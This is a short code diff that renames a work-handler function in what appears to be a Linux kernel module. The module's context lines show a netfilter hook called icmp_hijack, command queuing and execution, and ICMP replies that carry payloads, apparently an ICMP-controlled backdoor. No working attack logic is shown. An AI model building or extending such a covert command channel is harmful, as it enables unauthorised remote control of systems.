@@ -47,7 +47,7 @@ struct work_item {
 }
 
 // Work
-static void handle_work(struct work_struct *work);
+static void icmp_handle_work(struct work_struct *work);
 // Commands
 static int queue_execute(command_t type, char *argument);
 char **split_on_strings(char *string, int *token_count);
@@ -58,7 +58,7 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 static uint16_t checksum(uint16_t *data, int len);
 static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
 
-static void handle_work(struct work_struct *work) {
+static void icmp_handle_work(struct work_struct *work) {
     int ret;
 
     pr_info("Entering work handler...\n");
@@ -113,7 +113,7 @@ static int queue_execute(command_t type, char *argument){
     struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);
     work->command = command;
 
-    INIT_WORK(&work->work, handle_work);
+    INIT_WORK(&work->work, icmp_handle_work);
     queue_work(work_queue, &work->work);
     atomic_inc(&work_count);
 
